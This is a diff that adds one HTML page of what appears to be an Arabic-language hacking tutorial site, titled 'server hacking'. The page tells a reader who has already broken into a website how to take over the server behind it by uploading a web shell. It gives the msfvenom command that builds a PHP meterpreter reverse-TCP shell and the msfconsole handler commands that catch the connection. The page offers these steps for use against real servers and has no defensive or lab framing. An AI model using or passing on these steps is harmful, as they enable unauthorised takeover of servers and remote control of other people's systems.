@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="apple-touch-icon" href="images/template/picture.png"/>
+    <link rel="stylesheet" href="stiyl.css">
+    <title>اختراق السيرفرات</title>
+</head>
+<body>
+    <header>
+        <nav class="logo">
+            <a href="indiex.html" >Azmov</a>
+        </nav>
+        <nav class="icon">
+            <a href="indiex.html" ><i class="fa-solid fa-house"></i></a>
+        </nav>
+    </header>
+    <div class="mo">
+        <h2>
+            اختراق السيرفرات <br>
+بعد ان قمت ب اختراق الموقع المراد هنا تبدا تفكر في الهيمنة علي السيرفر المتصل به الموقع  , اذا كيف يحدث ذالك ؟<br>
+ذالك يعتمد ايضا علي الفحص من خلال فحص ل اي بي السيرفر هناك احتمال وجود ثغرات ما عليك الا ان تحداد الثغر تبحث عن الاستغلال <br>
+احد طرق اختراق السيرفرات هي في حالة امكانية رفع ملف للموقع بذالك تقوم ب انشاء شيل وتقوم برعه علي الموقع <br>
+طريقة عمل الشيل <br>
+(msfvenom -p php/meterpreter_reverse_tcp LHOST=(Your IP Address) LPORT=(Your Port to Connect On) -f raw > shell.php)<br>
+اسقبال الاتصال<br>
+msfconsole<br>
+use exploit/multi/handler<br>
+set PAYLOAD php/meterpreter_reverse_tcp<br>
+set LHOST (LHOST value)<br>
+set LPORT (LPORT value)<br>
+set ExitOnSession false<br>
+exploit -j -z
+        </h2>
+    </div>
+    <a href="index8.htm" class="botn">التالي</a>
+</body>
+</html>
